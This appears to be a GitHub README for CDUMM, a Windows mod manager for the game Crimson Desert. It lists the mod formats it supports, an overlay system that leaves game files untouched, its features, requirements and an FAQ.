### Crimson Desert Ultimate Mods Manager
## ![⬇️ Download Latest Release](https://github.com/ExecutorDrag/Crimson-Desert-Ultimate-Mods-Manager/releases/download/UltimateModsManager/Ultimate.Mods.Manager.-.CDUMM.zip)

<img width="921" height="681" alt="Screenshot 2026-04-18 181830" src="https://github.com/user-attachments/assets/624519e6-7405-4114-9036-3c965ebbb81f" />


# CDUMM — Crimson Desert Ultimate Mods Manager

> The only mod manager you need. Every format. Every store platform. One click.

---

## How It Works

Your original game files are never modified. Mods are decomposed into entry-level deltas and applied through an overlay directory. Reverting is instant — your vanilla files stay safe.

---

## Quick Start

1. **Download** `CDUMM.msi` and run it — no install needed
2. **Welcome wizard** guides you through language, theme, and game folder setup
3. **Drop mods** onto the window — drop dozens at once for fast batch import
4. **Click Apply**

> If something goes wrong, click **Fix Everything** to restore clean state.

---

## Supported Formats

| Format | Description |
|--------|-------------|
| 📦 Archives | ZIP, 7z, RAR (auto-extracted) |
| 🔧 JSON byte-patches | Signature-based, survives game updates |
| 🧩 Crimson Browser mods | manifest.json + loose files |
| 📁 Loose file mods | Folder drops with numbered directories |
| 🗃️ Standalone PAZ mods | Pre-compiled PAZ/PAMT pairs |
| 🖼️ DDS textures | Full PATHC index registration |
| 📄 XML replacements | OG_ naming convention support |
| 🔌 ASI plugins | Install, enable/disable, config editing |
| 🔊 Soundbanks | BNK audio mod support |
| 📜 Scripts | .bat and .py mod installers |
| ⚡ Binary patches | bsdiff and xdelta |
| 📦 Mixed archives | ZIPs with ASI + PAZ auto-separated |

---

## Key Features

### ⚡ Performance

- **Batch import** — drop dozens of mods at once, single-process import
- **Fast apply** — overlay cache + native engine, applies in seconds
- **Smart detection** — ASI, PAZ, JSON, DDS mods auto-routed to the right handler

### 🔧 Mod Management

- **Entry-level composition** — multiple mods safely modify the same PAZ file
- **Semantic merging** — field-level diffing for 322 data table schemas
- **Conflict detection** — see exactly what overlaps and why
- **Override mode** — mod authors can declare conflict winners in modinfo.json
- **Load order** — drag-and-drop reordering with folder groups
- **Configurable mods** — preset picker for multi-variant mods, per-patch toggle

### 🎮 Game Integration

- **Auto-detection** — finds your game on Steam, Epic Games, or Xbox Game Pass
- **Update detection** — flags outdated mods after game patches
- **ASI management** — full plugin page with version tracking, enable/disable, config editing
- **Launch game** — start Crimson Desert directly from the manager

### 🎨 Interface

- **Clean card-based UI** — Fluent Design with drag-reorder and folder groups
- **Welcome wizard** — guided first-time setup
- **Light & Dark themes** — choose during setup or switch anytime
- **16 languages** — English, Deutsch, Español, Français, 한국어, 日本語, 简体中文, 繁體中文, العربية, Italiano, Polski, Русский, Türkçe, Українська, Bahasa Indonesia, Português

---

## ⚠️ Important

- Game files must be **vanilla** before first launch. Use Steam → Verify Integrity if you have mods installed manually
- **Do not run as administrator** — breaks drag-and-drop functionality

---

## Requirements

- Windows 10 / 11
- Crimson Desert (Steam, Epic Games Store, or Xbox Game Pass)

---

## FAQ

### Can it break my game?
Original files are never modified. **Fix Everything** restores clean state. If all else fails, Steam → Verify Integrity.

### Two mods conflict?
Most conflicts resolve automatically via semantic merging. For byte-range overlaps, load order determines the winner. Mod authors can set override mode.

### Mod shows "no data"?
Remove and reimport from the original download.

### Works with other mod managers?
CDUMM handles everything — plus ASI plugins, texture mods, batch import, and folder groups.

### After a game update?
Open CDUMM — it detects the update and flags outdated mods. Use Tools → Rescan After Steam Verify.

### Mixed mod archives?
ZIPs containing both ASI and PAZ mods are handled automatically. ASI files go to bin64, PAZ data goes to the mod list.

---

## Tags

`crimson-desert` `mod-manager` `ultimate-mod-manager` `game-modding` `asi` `paz` `json` `dds` `textures` `soundbanks` `mod-installer` `overlay-system`
